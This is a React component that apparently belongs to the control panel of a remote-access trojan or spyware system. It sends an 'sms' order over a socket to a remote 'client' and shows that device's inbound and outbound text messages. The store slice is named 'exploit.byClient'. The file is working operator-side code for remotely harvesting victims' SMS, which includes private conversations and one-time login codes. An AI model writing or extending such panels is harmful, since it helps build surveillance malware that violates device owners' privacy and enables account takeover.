
import { useEffect } from 'react'
import { Button } from '@/components/ui/button'
import { MessageSquare, RefreshCw } from 'lucide-react'
import { emitOrder } from '@/lib/socket'
import { useAppSelector } from '@/store/hooks'
import { Badge } from '@/components/ui/badge'

export function SmsTab({ clientId }: { clientId: string }) {
  const sms = useAppSelector((s) => s.exploit.byClient[clientId]?.sms ?? [])

  useEffect(() => {
    emitOrder(clientId, 'sms')
  }, [clientId])

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <MessageSquare className="h-4 w-4 text-emerald-400" />
          <h3 className="text-sm font-semibold text-zinc-100">SMS Inbox</h3>
        </div>
        <Button
          variant="outline"
          size="sm"
          onClick={() => emitOrder(clientId, 'sms')}
          className="bg-transparent border-white/15 text-zinc-300 hover:bg-white/5"
        >
          <RefreshCw className="h-3.5 w-3.5" /> Refresh
        </Button>
      </div>

      <div className="rounded-xl border border-white/10 overflow-hidden">
        <div className="grid grid-cols-[auto_1fr_auto] gap-3 bg-zinc-900/60 px-3 py-2 text-[11px] uppercase tracking-wider text-zinc-500 border-b border-white/10">
          <span>From</span>
          <span>Message</span>
          <span>Date</span>
        </div>
        <div className="max-h-80 overflow-y-auto scrollbar-emerald divide-y divide-white/5">
          {sms.length === 0 ? (
            <div className="px-3 py-8 text-center text-xs text-zinc-600">
              No messages fetched.
            </div>
          ) : (
            sms.map((s, i) => (
              <div
                key={i}
                className="grid grid-cols-[auto_1fr_auto] gap-3 px-3 py-2 text-xs hover:bg-white/[0.03]"
              >
                <span className="flex items-center gap-2">
                  <Badge
                    className={`px-1.5 text-[9px] ${
                      s.type === 1
                        ? 'bg-emerald-500/15 text-emerald-300'
                        : 'bg-amber-500/15 text-amber-300'
                    }`}
                  >
                    {s.type === 1 ? 'IN' : 'OUT'}
                  </Badge>
                  <span className="text-zinc-200 font-mono">{s.address}</span>
                </span>
                <span className="text-zinc-400">{s.body}</span>
                <span className="text-zinc-600 whitespace-nowrap">
                  {new Date(s.date).toLocaleString()}
                </span>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  )
}
